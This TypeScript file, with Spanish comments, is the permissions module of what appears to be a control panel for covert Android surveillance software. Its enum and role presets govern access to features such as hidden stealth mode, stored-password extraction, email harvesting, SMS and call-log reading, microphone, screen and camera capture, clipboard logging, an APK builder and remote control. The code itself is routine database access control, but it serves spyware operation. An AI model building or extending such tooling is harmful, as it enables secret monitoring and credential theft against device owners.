import { getDb } from "./db";
import { userPermissions, devicePermissions, permissions, auditLogs } from "../drizzle/schema";
import { eq, and } from "drizzle-orm";

/**
 * Enum de permisos disponibles
 */
export enum Permission {
  GPS_LOGGING = "GPS_LOGGING",
  MICROPHONE_RECORDING = "MICROPHONE_RECORDING",
  VIEW_CONTACTS = "VIEW_CONTACTS",
  SMS_LOGS = "SMS_LOGS",
  SEND_SMS = "SEND_SMS",
  CALL_LOGS = "CALL_LOGS",
  VIEW_INSTALLED_APPS = "VIEW_INSTALLED_APPS",
  CLIPBOARD_LOGGING = "CLIPBOARD_LOGGING",
  NOTIFICATION_LOGGING = "NOTIFICATION_LOGGING",
  FILE_EXPLORER = "FILE_EXPLORER",
  SCREEN_RECORDING = "SCREEN_RECORDING",
  CAMERA_ACCESS = "CAMERA_ACCESS",
  LOCATION_TRACKING = "LOCATION_TRACKING",
  EMAIL_HARVESTING = "EMAIL_HARVESTING",
  PASSWORD_EXTRACTION = "PASSWORD_EXTRACTION",
  STEALTH_MODE = "STEALTH_MODE",
  
  // UI Menu Permissions (Legacy)
  MENU_DASHBOARD = "MENU_DASHBOARD",
  MENU_DEVICES = "MENU_DEVICES",
  MENU_REMOTE_CONTROL = "MENU_REMOTE_CONTROL",
  MENU_APK_BUILDER = "MENU_APK_BUILDER",
  MENU_SMS_LOGS = "MENU_SMS_LOGS",
  MENU_CALL_LOGS = "MENU_CALL_LOGS",
  MENU_LOCATION = "MENU_LOCATION",
  MENU_FILE_EXPLORER = "MENU_FILE_EXPLORER",
  MENU_NOTIFICATIONS = "MENU_NOTIFICATIONS",
  MENU_APPS = "MENU_APPS",

  // Section Permissions (UI Access Control)
  SECTION_DASHBOARD = "section:dashboard",
  SECTION_DEVICES = "section:devices",
  SECTION_USERS = "section:users",
  SECTION_PERMISSIONS = "section:permissions",
  SECTION_PERMISSIONS_MANAGEMENT = "section:permissions_management",
  SECTION_APK_BUILDER = "section:apk_builder",
  SECTION_AUDIT_LOGS = "section:audit_logs",
  SECTION_SETTINGS = "section:settings",
  SECTION_DEVICE_MAP = "section:device_map",
  SECTION_APP_MANAGER = "section:app_manager",
  SECTION_FILE_EXPLORER = "section:file_explorer",
  SECTION_ADVANCED_MONITORING = "section:advanced_monitoring",
  SECTION_DEVICE_MONITORING = "section:device_monitoring",
  SECTION_REMOTE_CONTROL = "section:remote_control",
  SECTION_ANALYTICS = "section:analytics",
  SECTION_GEOFENCING = "section:geofencing",
  SECTION_NOTIFICATIONS = "section:notifications",
  SECTION_GPS_TRACKER = "section:gps_tracker",
  SECTION_COMPLIANCE = "section:compliance",
  SECTION_MEDIA_CAPTURE = "section:media_capture",
  SECTION_COMMUNICATIONS = "section:communications",
  SECTION_PROFILE = "section:profile",
}

/**
 * Presets de permisos por rol
 */
export const PERMISSION_PRESETS = {
  admin: Object.values(Permission),
  manager: [
    Permission.GPS_LOGGING,
    Permission.VIEW_CONTACTS,
    Permission.SMS_LOGS,
    Permission.CALL_LOGS,
    Permission.VIEW_INSTALLED_APPS,
    Permission.CLIPBOARD_LOGGING,
    Permission.NOTIFICATION_LOGGING,
    Permission.FILE_EXPLORER,
    Permission.LOCATION_TRACKING,
  ],
  user: [
    Permission.GPS_LOGGING,
    Permission.SMS_LOGS,
    Permission.CALL_LOGS,
    Permission.VIEW_INSTALLED_APPS,
    Permission.CLIPBOARD_LOGGING,
    Permission.LOCATION_TRACKING,
  ],
  viewer: [Permission.GPS_LOGGING, Permission.LOCATION_TRACKING, Permission.SMS_LOGS],
};

/**
 * Categorías de permisos
 */
export const PERMISSION_CATEGORIES = {
  location: [Permission.GPS_LOGGING, Permission.LOCATION_TRACKING],
  audio: [Permission.MICROPHONE_RECORDING, Permission.SCREEN_RECORDING],
  contacts: [Permission.VIEW_CONTACTS, Permission.SMS_LOGS, Permission.CALL_LOGS],
  messaging: [Permission.SMS_LOGS, Permission.SEND_SMS],
  apps: [Permission.VIEW_INSTALLED_APPS],
  data: [
    Permission.CLIPBOARD_LOGGING,
    Permission.NOTIFICATION_LOGGING,
    Permission.FILE_EXPLORER,
  ],
  media: [Permission.CAMERA_ACCESS, Permission.SCREEN_RECORDING],
  security: [
    Permission.EMAIL_HARVESTING,
    Permission.PASSWORD_EXTRACTION,
    Permission.STEALTH_MODE,
  ],
  ui: [
    Permission.MENU_DASHBOARD,
    Permission.MENU_DEVICES,
    Permission.MENU_REMOTE_CONTROL,
    Permission.MENU_APK_BUILDER,
    Permission.MENU_SMS_LOGS,
    Permission.MENU_CALL_LOGS,
    Permission.MENU_LOCATION,
    Permission.MENU_FILE_EXPLORER,
    Permission.MENU_NOTIFICATIONS,
    Permission.MENU_APPS,
  ],
  sections: [
    Permission.SECTION_DASHBOARD,
    Permission.SECTION_DEVICES,
    Permission.SECTION_USERS,
    Permission.SECTION_PERMISSIONS,
    Permission.SECTION_PERMISSIONS_MANAGEMENT,
    Permission.SECTION_APK_BUILDER,
    Permission.SECTION_AUDIT_LOGS,
    Permission.SECTION_SETTINGS,
    Permission.SECTION_DEVICE_MAP,
    Permission.SECTION_APP_MANAGER,
    Permission.SECTION_FILE_EXPLORER,
    Permission.SECTION_ADVANCED_MONITORING,
    Permission.SECTION_DEVICE_MONITORING,
    Permission.SECTION_REMOTE_CONTROL,
    Permission.SECTION_ANALYTICS,
    Permission.SECTION_GEOFENCING,
    Permission.SECTION_NOTIFICATIONS,
    Permission.SECTION_GPS_TRACKER,
    Permission.SECTION_COMPLIANCE,
    Permission.SECTION_MEDIA_CAPTURE,
    Permission.SECTION_COMMUNICATIONS,
    Permission.SECTION_PROFILE,
  ],
};

/**
 * Descripciones de permisos
 */
export const PERMISSION_DESCRIPTIONS: Record<Permission, string> = {
  [Permission.GPS_LOGGING]: "Registrar ubicación GPS en tiempo real del dispositivo",
  [Permission.MICROPHONE_RECORDING]: "Grabar audio del micrófono del dispositivo",
  [Permission.VIEW_CONTACTS]: "Acceder a la lista de contactos del dispositivo",
  [Permission.SMS_LOGS]: "Ver historial de mensajes SMS enviados y recibidos",
  [Permission.SEND_SMS]: "Enviar mensajes SMS desde el dispositivo",
  [Permission.CALL_LOGS]: "Ver historial de llamadas entrantes y salientes",
  [Permission.VIEW_INSTALLED_APPS]: "Ver lista de aplicaciones instaladas",
  [Permission.CLIPBOARD_LOGGING]: "Registrar contenido del portapapeles",
  [Permission.NOTIFICATION_LOGGING]: "Capturar notificaciones del sistema",
  [Permission.FILE_EXPLORER]: "Explorar y acceder al sistema de archivos",
  [Permission.SCREEN_RECORDING]: "Grabar pantalla del dispositivo",
  [Permission.CAMERA_ACCESS]: "Acceder a la cámara del dispositivo",
  [Permission.LOCATION_TRACKING]: "Rastrear ubicación histórica del dispositivo",
  [Permission.EMAIL_HARVESTING]: "Extraer direcciones de correo electrónico",
  [Permission.PASSWORD_EXTRACTION]: "Extraer contraseñas almacenadas",
  [Permission.STEALTH_MODE]: "Ejecutar en modo oculto sin notificaciones",
  
  // UI Legacy Descriptions
  [Permission.MENU_DASHBOARD]: "Ver panel de control principal",
  [Permission.MENU_DEVICES]: "Ver lista y gestión de dispositivos",
  [Permission.MENU_REMOTE_CONTROL]: "Acceso a la herramienta de Control Remoto",
  [Permission.MENU_APK_BUILDER]: "Acceso al constructor de APKs",
  [Permission.MENU_SMS_LOGS]: "Ver menú de registros SMS",
  [Permission.MENU_CALL_LOGS]: "Ver menú de registros de llamadas",
  [Permission.MENU_LOCATION]: "Ver menú de mapas y ubicación",
  [Permission.MENU_FILE_EXPLORER]: "Ver menú de explorador de archivos",
  [Permission.MENU_NOTIFICATIONS]: "Ver menú de notificaciones",
  [Permission.MENU_APPS]: "Ver menú de aplicaciones instaladas",

  // Section Permissions Descriptions
  [Permission.SECTION_DASHBOARD]: "Acceso al Dashboard principal",
  [Permission.SECTION_DEVICES]: "Acceso a Gestión de Dispositivos",
  [Permission.SECTION_USERS]: "Acceso a Gestión de Usuarios",
  [Permission.SECTION_PERMISSIONS]: "Acceso a Configuración de Permisos",
  [Permission.SECTION_PERMISSIONS_MANAGEMENT]: "Acceso a Gestión Granular de Permisos",
  [Permission.SECTION_APK_BUILDER]: "Acceso al Constructor de APK",
  [Permission.SECTION_AUDIT_LOGS]: "Acceso a Logs de Auditoría",
  [Permission.SECTION_SETTINGS]: "Acceso a Configuración del Sistema",
  [Permission.SECTION_DEVICE_MAP]: "Acceso al Mapa de Dispositivos",
  [Permission.SECTION_APP_MANAGER]: "Acceso al Gestor de Aplicaciones",
  [Permission.SECTION_FILE_EXPLORER]: "Acceso al Explorador de Archivos",
  [Permission.SECTION_ADVANCED_MONITORING]: "Acceso a Monitoreo Avanzado",
  [Permission.SECTION_DEVICE_MONITORING]: "Acceso a Monitor de Dispositivo (GPS/SMS)",
  [Permission.SECTION_REMOTE_CONTROL]: "Acceso a Control Remoto",
  [Permission.SECTION_ANALYTICS]: "Acceso a Analíticas",
  [Permission.SECTION_GEOFENCING]: "Acceso a Geofencing",
  [Permission.SECTION_NOTIFICATIONS]: "Acceso a Notificaciones",
  [Permission.SECTION_GPS_TRACKER]: "Acceso a GPS y Geocercas",
  [Permission.SECTION_COMPLIANCE]: "Acceso a Compliance & DLP",
  [Permission.SECTION_MEDIA_CAPTURE]: "Acceso a Captura Remota",
  [Permission.SECTION_COMMUNICATIONS]: "Acceso a Comunicaciones MDM",
  [Permission.SECTION_PROFILE]: "Acceso a Mi Perfil",
};

/**
 * Servicio de gestión de permisos
 */
export const permissionsManager = {
  /**
   * Obtener ID de permiso por código
   */
  async getPermissionId(code: Permission): Promise<number | null> {
    const db = await getDb();
    if (!db) return null;

    try {
      const perm = await db
        .select()
        .from(permissions)
        .where(eq(permissions.code, code))
        .limit(1);

      return perm.length > 0 ? perm[0].id : null;
    } catch (error) {
      console.error("[Permissions] Error getting permission ID:", error);
      return null;
    }
  },

  /**
   * Obtener permisos de usuario
   */
  async getUserPermissions(userId: number): Promise<Permission[]> {
    const db = await getDb();
    if (!db) return [];

    try {
      const perms = await db
        .select()
        .from(userPermissions)
        .where(eq(userPermissions.userId, userId));

      const permCodes: Permission[] = [];
      for (const perm of perms) {
        const permData = await db
          .select()
          .from(permissions)
          .where(eq(permissions.id, perm.permissionId))
          .limit(1);

        if (permData.length > 0) {
          permCodes.push(permData[0].code as Permission);
        }
      }

      return permCodes;
    } catch (error) {
      console.error("[Permissions] Error getting user permissions:", error);
      return [];
    }
  },

  /**
   * Obtener permisos de dispositivo para usuario
   */
  async getDevicePermissions(deviceId: number, userId: number): Promise<Permission[]> {
    const db = await getDb();
    if (!db) return [];

    try {
      const perms = await db
        .select()
        .from(devicePermissions)
        .where(and(eq(devicePermissions.deviceId, deviceId), eq(devicePermissions.userId, userId)));

      const permCodes: Permission[] = [];
      for (const perm of perms) {
        const permData = await db
          .select()
          .from(permissions)
          .where(eq(permissions.id, perm.permissionId))
          .limit(1);

        if (permData.length > 0) {
          permCodes.push(permData[0].code as Permission);
        }
      }

      return permCodes;
    } catch (error) {
      console.error("[Permissions] Error getting device permissions:", error);
      return [];
    }
  },

  /**
   * Obtener permisos efectivos (Lógica Platinum: Prioridad Granular)
   */
  async getEffectivePermissions(
    userId: number,
    deviceId: number
  ): Promise<Permission[]> {
    const db = await getDb();
    if (!db) return [];

    // Prioridad 0: Admins tienen todo
    const { users } = await import("../drizzle/schema");
    const user = await db.select().from(users).where(eq(users.id, userId)).limit(1);
    if (user.length > 0 && user[0].role === "admin") {
      return this.getAllPermissions();
    }

    const devicePerms = await this.getDevicePermissions(deviceId, userId);
    
    // Si hay permisos granulares definidos para este dispositivo, esos son los efectivos
    if (devicePerms.length > 0) {
      return devicePerms;
    }

    // Si no hay granulares, usamos los globales del usuario
    return await this.getUserPermissions(userId);
  },

  /**
   * Verificar si usuario tiene permiso específico
   */
  async hasPermission(
    userId: number,
    deviceId: number,
    permission: Permission
  ): Promise<boolean> {
    const effectivePerms = await this.getEffectivePermissions(userId, deviceId);
    return effectivePerms.includes(permission);
  },

  /**
   * Asignar permiso a usuario
   */
  async assignUserPermission(userId: number, permission: Permission): Promise<void> {
    const db = await getDb();
    if (!db) return;

    try {
      const permissionId = await this.getPermissionId(permission);
      if (!permissionId) {
        console.error(`[Permissions] Permission ${permission} not found`);
        return;
      }

      await db.insert(userPermissions).values({
        userId,
        permissionId,
        grantedAt: new Date(),
      });

      console.log(`[Permissions] Assigned ${permission} to user ${userId}`);
    } catch (error) {
      console.error("[Permissions] Error assigning user permission:", error);
    }
  },

  /**
   * Revocar permiso de usuario
   */
  async revokeUserPermission(userId: number, permission: Permission): Promise<void> {
    const db = await getDb();
    if (!db) return;

    try {
      const permissionId = await this.getPermissionId(permission);
      if (!permissionId) return;

      await db
        .delete(userPermissions)
        .where(
          and(eq(userPermissions.userId, userId), eq(userPermissions.permissionId, permissionId))
        );

      console.log(`[Permissions] Revoked ${permission} from user ${userId}`);
    } catch (error) {
      console.error("[Permissions] Error revoking user permission:", error);
    }
  },

  /**
   * Asignar permiso a dispositivo para usuario
   */
  async assignDevicePermission(
    deviceId: number,
    userId: number,
    permission: Permission
  ): Promise<void> {
    const db = await getDb();
    if (!db) return;

    try {
      const permissionId = await this.getPermissionId(permission);
      if (!permissionId) return;

      await db.insert(devicePermissions).values({
        deviceId,
        userId,
        permissionId,
        grantedAt: new Date(),
      });

      console.log(`[Permissions] Assigned ${permission} to user ${userId} on device ${deviceId}`);
    } catch (error) {
      console.error("[Permissions] Error assigning device permission:", error);
    }
  },

  /**
   * Revocar permiso de dispositivo
   */
  async revokeDevicePermission(
    deviceId: number,
    userId: number,
    permission: Permission
  ): Promise<void> {
    const db = await getDb();
    if (!db) return;

    try {
      const permissionId = await this.getPermissionId(permission);
      if (!permissionId) return;

      await db
        .delete(devicePermissions)
        .where(
          and(
            eq(devicePermissions.deviceId, deviceId),
            eq(devicePermissions.userId, userId),
            eq(devicePermissions.permissionId, permissionId)
          )
        );

      console.log(`[Permissions] Revoked ${permission} from user ${userId} on device ${deviceId}`);
    } catch (error) {
      console.error("[Permissions] Error revoking device permission:", error);
    }
  },

  /**
   * Asignar preset de permisos a usuario
   */
  async assignPreset(userId: number, preset: keyof typeof PERMISSION_PRESETS): Promise<void> {
    const perms = PERMISSION_PRESETS[preset];

    for (const permission of perms) {
      await this.assignUserPermission(userId, permission);
    }

    console.log(`[Permissions] Assigned ${preset} preset to user ${userId}`);
  },

  /**
   * Limpiar todos los permisos de usuario
   */
  async clearUserPermissions(userId: number): Promise<void> {
    const db = await getDb();
    if (!db) return;

    try {
      await db.delete(userPermissions).where(eq(userPermissions.userId, userId));
      console.log(`[Permissions] Cleared all permissions for user ${userId}`);
    } catch (error) {
      console.error("[Permissions] Error clearing user permissions:", error);
    }
  },

  /**
   * Obtener matriz de permisos (usuario x dispositivo)
   */
  async getPermissionMatrix(
    userId: number,
    deviceIds: number[]
  ): Promise<Record<number, Permission[]>> {
    const matrix: Record<number, Permission[]> = {};

    for (const deviceId of deviceIds) {
      matrix[deviceId] = await this.getEffectivePermissions(userId, deviceId);
    }

    return matrix;
  },

  /**
   * Obtener descripción de permiso
   */
  getPermissionDescription(permission: Permission): string {
    return PERMISSION_DESCRIPTIONS[permission] || "Permiso desconocido";
  },

  /**
   * Obtener categoría de permiso
   */
  getPermissionCategory(permission: Permission): string {
    for (const [category, perms] of Object.entries(PERMISSION_CATEGORIES)) {
      if (perms.includes(permission)) {
        return category;
      }
    }
    return "other";
  },

  /**
   * Obtener todos los permisos disponibles
   */
  getAllPermissions(): Permission[] {
    return Object.values(Permission);
  },

  /**
   * Obtener permisos por categoría
   */
  getPermissionsByCategory(category: string): Permission[] {
    return (PERMISSION_CATEGORIES as Record<string, Permission[]>)[category] || [];
  },

  /**
   * Validar lista de permisos
   */
  validatePermissions(permissions: string[]): Permission[] {
    return permissions.filter((p) => Object.values(Permission).includes(p as Permission)) as Permission[];
  },
};
